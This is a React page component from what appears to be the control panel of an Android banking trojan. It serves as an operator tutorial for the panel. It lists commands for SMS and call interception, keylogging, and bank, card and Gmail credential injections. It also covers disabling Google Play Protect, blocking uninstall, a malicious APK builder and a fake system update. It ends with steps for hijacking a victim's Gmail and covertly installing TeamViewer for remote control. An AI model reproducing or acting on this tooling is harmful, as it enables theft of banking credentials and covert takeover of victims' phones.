import React from 'react';

// Домашняя страница. Пока только FAQ. Надо будет добавить стату
// TODO: добавить стату
class HomePage extends React.Component {
    render () {
        return (
            <div>
                <center><img style={({width:'300px'})} src="img/alient.png"/></center>

               <center> <h2>Tutorial</h2></center>

                <br/>

                <center><img style={({width: '130vh'})} src="img/global.png"/></center>

                <h4>1. Control panel</h4>
                <span >Bots – Bots table<br/>
Banks – display a report that contains data on banks<br/>
Cards – display a report that contains data about the Credit Cards<br/>
Email – display a report that has data about Emails<br/>
Injects – Injection list<br/>
Files – display a report in which the received files from the device holder are located<br/>
Builder – Builder apk file<br/>
Settings – Setting Panel<br/></span>

                <br/>

                <h4>2. Categories filter</h4>

                <br/>

                <h4>3. Bots</h4>

                <span><i class="fa fa-users"></i> - ID Bots, status icon: unlock/lock screen device, hidden SMS, accessibility service, admin device, permission store, permission SMS, permission call and permission phone book<br/>
 
                <i class="far fa-flag"/> - IP, Country<br/>
                <i class="fal fa-tag"/> - Tag<br/>
                <i class="fab fa-android"/> - Version Android<br/>
                <i class="far fa-mobile"/>- Information Model, Number Phone, email authorized in the device<br/>
                <i class="fas fa-shield-alt"/> - Enabled Google Play Protect and installed antivirus software<br/>
                <i class="fas fa-university"/>- Injects, type: bank, email, credit card<br/>
                <i class="far fa-exchange"/>- Device last online<br/>
                <i class="fa fa-calendar-plus"/> - Malware installation date<br/>
                <i class="fal fa-cogs"/> - RAT, Setting Device<br/>
                <i class="fal fa-comment"/> - Comments<br/></span>
              
                <br/>

                <h4>4. Number of items displayed per page, count all bots</h4>

                <br/>

                <h4>5. Number page</h4>

                <br/>

                <h4>6. Managements bots, remove bots and add command bots</h4>
                <br/>
                <h4>7. RAT and Settings bot</h4>
                <br/>

                <center><img style={({width: '130vh'})} src="img/command.png"/></center>

                <span>Send SMS – Sending SMS from the device holder.<br/>
Run USSD request – USSD from the device holder.<br/>
Send push notification – push notifications for the application<br/>
Send auto push notification – auto push notification for applications, receives text and title from the main settings of the panel, the application selects automatically.<br/>
Run forwarding – Forwarding all call.<br/>
Run application – Run application from the device holder.<br/>
Open URL browser – Open URL from the device holder.<br/>
Run grabbing password gmail – Request a password from a gmail of an authorized device holder by injection method.<br/>
Get data device – Get logs: list phone book, saved SMS and installed applications.<br/>
Enable admin device – Enabled request admin device.<br/>
Run permission request – Enabled request all permission .<br/>
Delete application – remove the application on the device of the holder.<br/>
Remove a bot from the device – remove the bot on the device of the holder.<br/>
Download the new patch – Upgrade new patch malware.<br/></span>

                <br/>

            
                <center><img style={({width: '130vh'})} src="img/ratset.png"/></center>

                <span>Logs device – SMS interception, events bot<br/>
Logs keylogger – Logs keylogger from the device to holder<br/>
Data device – list phone book, saved sms, all installed applications<br/></span>

                <br/>

                <center> <h4>Settings Bot</h4></center>

                <center><img  style={({width: '130vh'})} src="img/setbot.png"/></center>

                <br/>

                <span>1. Data device<br/>
2. On/off sound to device holder<br/>
3. Lock device holder (black screen)<br/>
4. Enable collection of logs of a keylogger<br/>
5. Hide incoming and outgoing SMS<br/>
6. Active injects list<br/></span>
                
                <br/>

                <center><h4>RAT</h4></center>

                <center><img  style={({width: '130vh'})} src="img/rat.png"/></center>

                <br/>

                <span>1. File manager - work with the file system of the device holder<br/>
2. Connect device - To activate the work of the RAT device of the holder<br/>
3. Email TeamViewer - Your teamviewer account for remote device management<br/>
4. Password TeamViewer - Password your teamviewer<br/>
5. Connect TeamViewer device holder - Enter your details to connect teamviewer, + activation permissions to work on Samsung<br/>
6. Open application TeamViewer - Open teamviewer applications, this can be used to wake up teamviewer so that it is online<br/>
7. Send Settings - Set item 7 settings<br/>
8. Installed applications -  Get all applications in order to make sure that teamviewer and its addon are installed<br/>
9. Open fake system update – Launches a fake system update, can be used for hidden data entry in teamviewer (This function is raw, we recommend using it for now)<br/>
Minimize the TeamViewer after connecting - after entering data and clicking the "connect" button hides the teamviewer form<br/>
Blocking TeamViewer detection - Blocks teamviewer uninstalls<br/></span>
                
                <br/>

                <center>  <h4>Display a report that contains data on banks, credit cards and emails</h4></center>

                <center><img  style={({width: '130vh'})}  src="img/reportdisp.png"/></center>

                <br/>

                <span>1. Data<br/>
2. Bank application<br/>
3. ID Bot<br/>
4. Comments<br/></span>
                
                <br/>

                <center>   <h4>Uploading injections</h4></center>

                <center><img  style={({width: '130vh'})} src="img/upinj.png"/></center>

                <br/>

                <span>1. Select zip archive<br/>
                2. Upload zip archive<br/></span>

                <br/>

                <center>   <h4>Files received from device holders</h4></center>

                <center><img  style={({width: '130vh'})} src="img/resfiles.png"/></center>

                <br/>

                <span>1. Name file<br/>
                2. ID Device<br/></span>

                <br/>

                <center>  <h4>Builder</h4></center>

                <center><img style={({width: '130vh'})}  src="img/builder.png"/></center>

                <br/>

                <span>1. Name application.<br/>
                2. URL connect to server.<br/>
                3. Name accessibility service.<br/>
                4. The bot starts working with the server after the specified activity, the activity is indicated by a number, in order not to use this function, specify 0.<br/>
                5. Tag.<br/>
                6. Select icon format png 300x300.<br/>
                7. Run build apk.<br/>
                8. List of ready apk.<br/></span>

                <br/>

                <center> <h4>Settings</h4></center>

                <center><img style={({width: '130vh'})} src="img/setting.png"/></center>

                <br/>

                <span>List URL connect to server - ip or domain to connect the bot to the server, without limiting the count.<br/>
Web panel update time (Bots table) – time auto update table bots.<br/>
Google Play Protect disable – time request auto disabled Google Play Protect.<br/>
Enable admin device – time request admin device.<br/>
Enable request permissions – time request all permission.<br/>
Enable injection banks – time enable injections banks activation.<br/>
Enable injection credit cards – time enable injections credit cards activation.<br/>
Enable injection emails – time enable injections emails activation.<br/>
Data for auto push notifications – title and text for auto push notifications.<br/></span>

                <br/>

                <h4><center>Work with teamviewer (VNC)</center></h4>

                <span>1. It is necessary to get access to the gmail registered on the device of the holder. To do this, you can use gmail injections or request a password through the command "Run grabbing password gmail", you can find the necessary gmail in the bots table, column "Information Model".<br/>
2. Go to your gmail account, confirm authorization via SMS.<br/>
3. Install TeamViewer Host(com.teamviewer.host.market) through your account.<br/></span>

                <br/>

                <center><img style={({width: '130vh'})} src="img/tm1.png"/></center>

                <br/>

                <span>4) Install the teamviewer addon for the device model, for example, for Huawei "Add-On: Huawei (b)" (com.teamviewer.quicksupport.addon.huawei2).</span>

                <br/>

                <center><img  style={({width: '130vh'})} src="img/tm2.png"/></center>

                <br/>

                <span>5) Register a new account in teamviewer;<br/>
6. Connect via RAT to the holder device;<br/>
7. Check the list of applications, the presence of teamviewer and addon;<br/>
8. Enter your teamviewer data and press the "Connect TeamViewer" button, make sure that the device screen is unlocked;<br/>
9. If the device does not connect, you need to wake up the time receiver, so that the application receives Internet connections.<br/></span>
                
                <br/> <br/>

                <center> <b><span>This function is raw, if something doesn’t work, please contact support, together we will solve all problems :)</span></b></center>

            </div>
        );
    }
}

export default HomePage;